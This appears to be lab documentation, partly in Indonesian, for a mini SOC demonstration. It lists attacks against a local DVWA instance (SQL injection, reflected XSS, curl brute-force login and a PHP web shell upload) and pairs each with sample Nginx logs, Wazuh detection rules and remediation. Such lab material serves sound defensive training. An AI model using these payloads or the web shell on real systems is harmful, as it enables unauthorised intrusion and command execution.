# Attack Scenarios - Mini SOC DVWA

Dokumentasi skenario serangan yang akan dilakukan pada DVWA untuk demonstrasi attack-to-alert pipeline.

## 1. SQL Injection (SQLi) Attack

### Overview
SQL Injection adalah teknik serangan dimana attacker memanipulasi query database dengan memasukkan code SQL berbahaya melalui input fields.

### Target
- **URL**: `http://localhost:8080/vulnerabilities/sqli/`
- **Method**: GET
- **Parameter**: `id`
- **Difficulty Level**: Low

### Skenario Serangan

#### 1.1 Basic SQLi - Authentication Bypass
```
# Step 1: Akses halaman SQL Injection
URL: http://localhost:8080/vulnerabilities/sqli/

# Step 2: Masukkan payload di field input
Payload: admin' OR '1'='1
atau
Payload: 1' OR '1'='1' --

# Step 3: Submit dan lihat hasilnya
Expected Result: Database returns semua records tanpa proper filtering
```

**Log yang tergenerate (dalam Nginx access.log):**
```
127.0.0.1 - - [25/Apr/2026:10:30:45 +0000] "GET /vulnerabilities/sqli/?id=admin%27%20OR%20%271%27%3D%271 HTTP/1.1" 200 1234 ...
```

**Rule yang akan match:**
- Rule ID: 100100 (SQLi detection)
- Keyword match: `SELECT`, `UNION`, `OR`

#### 1.2 Advanced SQLi - UNION-based
```
Payload: 1' UNION SELECT user(),database() --

Expected Result: Mengambil informasi user dan database dari MySQL
```

#### 1.3 Time-based Blind SQLi
```
Payload: 1' AND SLEEP(5) --

Expected Result: Response delayed by 5 seconds (blind technique)
```

### Detection Indicators
| Indicator | Value |
|-----------|-------|
| Alert Level | 10 (Critical) |
| Rule ID | 100100 |
| Expected Latency | < 1 second detection |
| False Positive Rate | Low (specific SQL keywords) |

### Remediation
- Input validation dengan whitelist
- Gunakan prepared statements
- Implementasi WAF rules
- Database user dengan minimal privileges

---

## 2. Cross-Site Scripting (XSS) Attack

### Overview
XSS adalah serangan dimana attacker inject script berbahaya (biasanya JavaScript) ke web page untuk dieksekusi di browser user lain.

### Target
- **URL**: `http://localhost:8080/vulnerabilities/xss_reflected/`
- **Method**: GET
- **Parameter**: `name`
- **Difficulty Level**: Low

### Skenario Serangan

#### 2.1 Reflected XSS - Basic Alert
```
# Step 1: Akses halaman XSS Reflected
URL: http://localhost:8080/vulnerabilities/xss_reflected/

# Step 2: Masukkan payload
Payload: <script>alert('XSS Vulnerability Found')</script>

# Step 3: Submit
Expected Result: JavaScript alert muncul di browser
```

**Log yang tergenerate:**
```
127.0.0.1 - - [25/Apr/2026:10:30:50 +0000] "GET /vulnerabilities/xss_reflected/?name=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E HTTP/1.1" 200 1234 ...
```

#### 2.2 Encoded XSS
```
Payload: %3Cscript%3Ealert('XSS')%3C%2Fscript%3E

Expected Result: URL-encoded script tetap akan dideteksi
```

#### 2.3 Event Handler XSS
```
Payload: <img src=x onerror="alert('XSS')">

Expected Result: Script executed via event handler
```

### Detection Indicators
| Indicator | Value |
|-----------|-------|
| Alert Level | 10 (Critical) |
| Rule ID | 100101 |
| Expected Latency | < 1 second detection |
| Pattern | <script>, %3Cscript%3E |

### Remediation
- Output encoding
- Content Security Policy (CSP)
- Input sanitization
- HttpOnly & Secure cookies

---

## 3. Brute Force Attack

### Overview
Brute force adalah serangan dimana attacker melakukan multiple login attempts dengan kombinasi username/password yang berbeda.

### Target
- **URL**: `http://localhost:8080/vulnerabilities/brute/`
- **Method**: POST
- **Parameters**: `username`, `password`
- **Difficulty Level**: Low

### Skenario Serangan

#### 3.1 Manual Brute Force
```
# Step 1: Akses halaman login
URL: http://localhost:8080/vulnerabilities/brute/

# Step 2: Try multiple login attempts
Username: admin
Passwords: password, 123456, admin123, dvwa, admin, etc.

# Step 3: Repeat dengan berbagai kombinasi
Expected Result: Beberapa percobaan gagal, mungkin ada yang berhasil
```

#### 3.2 Using Tools (Burp Suite / OWASP ZAP)
```bash
# Menggunakan curl untuk brute force
for pass in password admin 123456 dvwa pass; do
    curl -X POST http://localhost:8080/vulnerabilities/brute/ \
         -d "username=admin&password=$pass" \
         -H "Content-Type: application/x-www-form-urlencoded"
done
```

**Log Pattern:**
```
127.0.0.1 - - [25/Apr/2026:10:31:00 +0000] "POST /vulnerabilities/brute/ HTTP/1.1" 401 1234 ...
127.0.0.1 - - [25/Apr/2026:10:31:01 +0000] "POST /vulnerabilities/brute/ HTTP/1.1" 401 1234 ...
127.0.0.1 - - [25/Apr/2026:10:31:02 +0000] "POST /vulnerabilities/brute/ HTTP/1.1" 401 1234 ...
(Multiple failed attempts dari same IP)
```

### Detection Indicators
| Indicator | Value |
|-----------|-------|
| Alert Level | 7-10 |
| Pattern | Multiple failed login attempts |
| Time Window | 1-5 minutes |
| Threshold | 5+ attempts |

### Remediation
- Account lockout policy
- Rate limiting
- CAPTCHA
- Multi-factor authentication (MFA)
- IP-based blocking after N attempts

---

## 4. File Upload Attack

### Overview
File upload vulnerability memungkinkan attacker upload file berbahaya ke server.

### Target
- **URL**: `http://localhost:8080/vulnerabilities/upload/`
- **Method**: POST (multipart/form-data)
- **Parameter**: `uploaded_file`
- **Difficulty Level**: Low

### Skenario Serangan

#### 4.1 Upload PHP Shell
```
# Step 1: Buat file shell.php
Content:
<?php
  system($_GET['cmd']);
?>

# Step 2: Upload file melalui form
File: shell.php

# Step 3: Akses file yang di-upload
URL: http://localhost:8080/vulnerabilities/upload/shell.php?cmd=whoami

Expected Result: Command dijalankan di server
```

**Log yang tergenerate:**
```
127.0.0.1 - - [25/Apr/2026:10:31:10 +0000] "POST /vulnerabilities/upload/ HTTP/1.1" 200 1234 ...
(Contains: Content-Disposition: form-data; name="uploaded_file"; filename="shell.php")
```

#### 4.2 Upload Executable File
```
File: reverse_shell.exe atau malware.sh

Expected Result: File uploaded successfully (dangerous!)
```

### Detection Indicators
| Indicator | Value |
|-----------|-------|
| Alert Level | 7 |
| Rule ID | 100102 |
| Pattern | .php, .exe, .sh extension |
| Expected Latency | < 1 second detection |

### Remediation
- Whitelist allowed file types
- Store uploads outside web root
- Rename uploaded files
- Disable script execution in upload directory
- Scan uploaded files with antivirus

---

## Pipeline Demonstration Flow

### Step-by-step Attack to Response

```
┌─────────────────────────────────────────────────┐
│ 1. ATTACKER PERFORMS ATTACK                     │
│    - Access DVWA                                │
│    - Submit malicious payload                   │
│    - Eg: SQLi, XSS, upload, brute force        │
└────────────┬────────────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────────────┐
│ 2. LOG GENERATION (Nginx)                       │
│    - Request captured in access.log             │
│    - Full URL with payload logged               │
│    - Source IP, timestamp, response code        │
└────────────┬────────────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────────────┐
│ 3. LOG TRANSMISSION (Filebeat → Wazuh)         │
│    - Filebeat reads nginx access.log            │
│    - Sends to Wazuh Manager (1514/tcp)         │
│    - Log parsed and processed                   │
└────────────┬────────────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────────────┐
│ 4. RULE MATCHING (Wazuh Manager)               │
│    - Rule engine analyzes log                   │
│    - Matches against custom_rules.xml           │
│    - Pattern found → Alert triggered            │
└────────────┬────────────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────────────┐
│ 5. ALERT INDEXING (Wazuh Indexer)              │
│    - Alert indexed in Elasticsearch             │
│    - Ready for search and visualization         │
│    - Timestamp, severity, metadata stored       │
└────────────┬────────────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────────────┐
│ 6. DASHBOARD VISUALIZATION                      │
│    - Alert appears in Wazuh Dashboard           │
│    - Analyst sees: Type, Source, Time, Payload  │
│    - Can drill down for details                 │
└────────────┬────────────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────────────┐
│ 7. ANALYSIS & RESPONSE                          │
│    - Analyst reviews alert                      │
│    - Investigates attack source                 │
│    - Takes response action                      │
│    - Documents incident                         │
└─────────────────────────────────────────────────┘
```

---

## Testing Checklist

- [ ] SQLi - Test basic authentication bypass
- [ ] SQLi - Test UNION-based injection
- [ ] XSS - Test reflected XSS
- [ ] XSS - Test encoded payloads
- [ ] Upload - Test PHP file upload
- [ ] Brute Force - Test multiple login attempts
- [ ] Verify Nginx logs contain payloads
- [ ] Verify Wazuh receives logs
- [ ] Verify alerts appear in dashboard
- [ ] Verify rules match correctly
- [ ] Document all alerts with screenshots

---

## References

- [DVWA SQL Injection](http://www.dvwa.co.uk/vulnerabilities/sqli/)
- [DVWA XSS](http://www.dvwa.co.uk/vulnerabilities/xss/)
- [DVWA File Upload](http://www.dvwa.co.uk/vulnerabilities/upload/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)

**Last Updated**: 2026-04-25
